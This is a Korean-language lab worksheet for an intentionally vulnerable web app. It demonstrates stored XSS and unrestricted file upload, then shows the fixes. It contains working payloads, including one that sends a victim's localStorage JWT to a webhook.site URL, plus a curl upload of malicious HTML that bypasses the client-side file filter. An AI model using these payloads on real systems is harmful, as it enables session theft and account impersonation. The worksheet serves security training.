# #01 Stored XSS  ·  #02 Unrestricted File Upload

**OWASP** A03 Injection / A05 Security Misconfiguration  ·  **난이도** ⭐⭐

---

## #01 — Stored XSS

### 취약점 원인

게시글 제목과 내용이 `dangerouslySetInnerHTML`로 렌더링되어 사용자 입력이 raw HTML로 출력됩니다.
게시글을 조회하는 **모든 사용자의 브라우저에서** 삽입된 스크립트가 실행됩니다.

**`frontend/src/pages/BoardDetail.jsx` — 132, 143번째 줄**
```jsx
<h1 dangerouslySetInnerHTML={{__html: post.title}}></h1>
<p  dangerouslySetInnerHTML={{__html: post.content}}></p>
```

---

### 공격 실습

**Step 1** — 로그인 후 상품 등록 페이지 이동

**Step 2** — 상품명에 페이로드 입력 후 등록
```html
<img src=x onerror="alert('XSS!')">
```

**Step 3** — 등록된 게시글 클릭 → `alert` 팝업 확인

> 이 게시글을 열람하는 모든 사용자에게 동일하게 실행됩니다.

---

### 심화 — JWT 토큰 탈취

이 앱은 JWT를 `localStorage`에 저장합니다. 아래 페이로드로 피해자의 토큰을 외부로 유출할 수 있습니다.

```html
<img src=x onerror="fetch('https://webhook.site/YOUR-ID?t='+localStorage.getItem('token'))">
```

**공격 흐름**
1. 공격자가 악성 게시글 등록
2. 피해자가 게시글 조회 → 스크립트 실행
3. 피해자의 JWT가 공격자 서버로 전송
4. 공격자는 해당 JWT로 피해자 계정 사칭

---

### 방어

```jsx
// 취약 — raw HTML 삽입
<h1 dangerouslySetInnerHTML={{__html: post.title}}></h1>

// 안전 — 텍스트로만 렌더링
<h1>{post.title}</h1>
```

HTML 입력이 반드시 필요한 경우 `DOMPurify`로 살균:
```jsx
import DOMPurify from 'dompurify';
<h1 dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(post.title)}}></h1>
```

---
---

## #02 — Unrestricted File Upload

### 취약점 원인

파일 업로드 시 타입 검증이 없고, `X-Content-Type-Options` 헤더가 제거되어 브라우저가 `.html` 파일을 실행합니다.

**`backend/routes/board.js` — 26번째 줄** (fileFilter 없음)
```js
const upload = multer({ storage: storage }); // 모든 파일 타입 허용
```

**`backend/server.js` — 20번째 줄** (MIME 스니핑 허용)
```js
res.removeHeader('X-Content-Type-Options'); // 브라우저가 .html을 HTML로 실행
```

---

### 공격 실습

**Step 1** — `malicious.html` 파일 생성
```html
<!DOCTYPE html>
<html>
<body>
<script>
  alert('악성 HTML 실행! 토큰: ' + localStorage.getItem('token'));
</script>
</body>
</html>
```

**Step 2** — curl로 업로드 (프론트엔드의 확장자 제한 우회)
```bash
curl -k -X POST https://192.168.1.20:5000/api/board \
  -H "Authorization: Bearer <your_token>" \
  -F "title=정상 상품" \
  -F "content=테스트" \
  -F "price=10000" \
  -F "manual=@malicious.html;type=text/html"
```

> 프론트엔드의 `accept=".pdf,.doc,.docx"`는 **클라이언트 측 제한**일 뿐입니다.
> Burp Suite로 요청을 가로채거나 curl로 직접 전송하면 우회됩니다.

**Step 3** — 업로드된 파일 URL로 직접 접속
```
https://192.168.1.20:5000/uploads/<업로드된_파일명>.html
```
스크립트가 실행됩니다.

---

### XSS 연계 공격

```
악성 .html 업로드 → URL 확보
↓
XSS 페이로드로 해당 URL로 리다이렉트
<script>window.location='https://192.168.1.20:5000/uploads/malicious.html'</script>
↓
피해자 자동 이동 → 스크립트 실행
```

---

### 방어

**파일 타입 검증 추가 (`board.js`)**
```js
const upload = multer({
  storage,
  fileFilter: (req, file, cb) => {
    const allowed = ['image/jpeg', 'image/png', 'application/pdf'];
    cb(allowed.includes(file.mimetype) ? null : new Error('허용되지 않는 형식'), allowed.includes(file.mimetype));
  },
  limits: { fileSize: 5 * 1024 * 1024 }
});
```

**헤더 제거 코드 삭제 (`server.js`)**
```js
// 아래 줄 제거 → helmet이 X-Content-Type-Options: nosniff를 기본 적용
res.removeHeader('X-Content-Type-Options'); // ← 이 줄 삭제
```
